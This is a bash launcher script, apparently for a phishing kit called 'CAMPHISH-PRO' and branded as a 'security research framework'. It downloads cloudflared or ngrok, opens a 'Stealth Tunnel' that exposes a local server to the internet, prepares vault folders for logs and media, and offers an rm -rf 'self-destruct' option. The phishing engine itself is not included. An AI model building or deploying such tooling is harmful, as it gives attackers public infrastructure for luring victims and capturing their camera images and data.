# CIPHER-X ELITE: Next-Generation Security Research Framework Motto: 
# "Deciphering the future before it happens.."
# --- Elite Color Palette ---
CYAN='\033[38;5;51m'
LIME='\033[38;5;118m'
GOLD='\033[38;5;220m'
RED='\033[38;5;196m'
WHT='\033[38;5;255m'
NC='\033[0m'

# --- Modular Binary Manager (Space Saver) ---
install_module() {
    local mod=$1
    local arch=$(uname -m)
    mkdir -p core
    case $mod in
        "cloudflared")
            if [[ ! -f "core/cloudflared" ]]; then
                echo -e "${LIME}[*] Downloading Cloudflared...${NC}"
                if [[ $arch == "aarch64" ]]; then
                    curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -o core/cloudflared
                else
                    curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o core/cloudflared
                fi
                chmod +x core/cloudflared
            fi ;;
        "ngrok")
            if [[ ! -f "core/ngrok" ]]; then
                echo -e "${LIME}[*] Downloading Ngrok...${NC}"
                # Termux/Linux automated fetch
                curl -L https://bin.equinox.io/c/bPR9B2h3Y6e/ngrok-v3-stable-linux-amd64.tgz | tar xz -C core/
                chmod +x core/ngrok
            fi ;;
    esac
}

banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
                  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
              ▄▓▓▓▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
            ▄▓▓▓▀
           ▓▓▓▀   
         ▓▓▓▀  ▓▓▓▓▓▓ 
       ▄▓▓▓   ▓▓▓   ▓▓
      ▓▓▓▓   ▐▓▓     ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
       ▀▓▓▓   ▓▓▓    ▓        ▐▓▓▓ ▐▓▓▓
         ▀▓▓▓  ▀▓▓▓▓▓         ▐▓▓▓  ▓▓
           ▀▓▓▓                 
             ▓▓▓▄
              ▐▓▓▓▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                ▀▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
EOF
    echo -e "      ${GOLD}\"Deciphering the future before it happens..\"${NC}"
    echo -e "${WHT}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${LIME} [DEVELOPER] : Biruk Getachew (CIPHER)"
    echo -e " [YOUTUBE]   : https://www.youtube.com/@cipher-attack"
    echo -e " [GITHUB]    : https://github.com/cipher-attack"
    echo -e " [TELEGRAM]  : https://t.me/cipher_attacks${NC}"
    echo -e "${WHT}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

menu() {
    banner
    echo -e "${CYAN}[ SELECT INFRASTRUCTURE ]${NC}"
    echo -e " ${WHT}[1]${NC} Cloudflared (Zero Trust Tunnel)"
    echo -e " ${WHT}[2]${NC} Ngrok (Developer Gateway)"
    echo -e " ${WHT}[3]${NC} Localhost (Internal Network)"
    echo -e " ${WHT}[4]${NC} System Self-Destruct (Clean All)${NC}"
    echo -e "${WHT}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    read -p " CHOICE > " infra_choice

    case $infra_choice in
        1)
            install_module "cloudflared"
            echo -e "${LIME}[*] Launching Cloudflared Stealth Tunnel...${NC}"
            ./core/cloudflared tunnel --url http://localhost:5000 > /dev/null 2>&1 &
            sleep 2
            ;;
        2)
            install_module "ngrok"
            echo -e "${LIME}[*] Launching Ngrok Tunnel...${NC}"
            ./core/ngrok http 5000 > /dev/null 2>&1 &
            sleep 2
            ;;
        3)
            echo -e "${LIME}[*] Starting Local Node Only...${NC}"
            ;;
        4)
            echo -e "${RED}[!] Executing System Wipe...${NC}"
            rm -rf core/ vault/ __pycache__/
            exit
            ;;
        *)
            echo -e "${RED}Invalid Choice.${NC}" ; exit
            ;;
    esac

    # --- THE MISSING ENGINE START COMMAND ---
    echo -e "${GOLD}[*] Initializing CAMPHISH-PRO Hyper-Engine...${NC}"
    if [[ -f "core/engine.py" ]]; then
        python3 core/engine.py
    else
        # ፋይሉ ከሌለ በስህተት እንዳይቆም ለሙከራ እንዲሆን እዚሁ መፍጠር እንችላለን
        echo -e "${RED}[!] core/engine.py not found. Make sure the file exists.${NC}"
    fi
}

# Initialize Directories
mkdir -p core vault/logs vault/media
menu
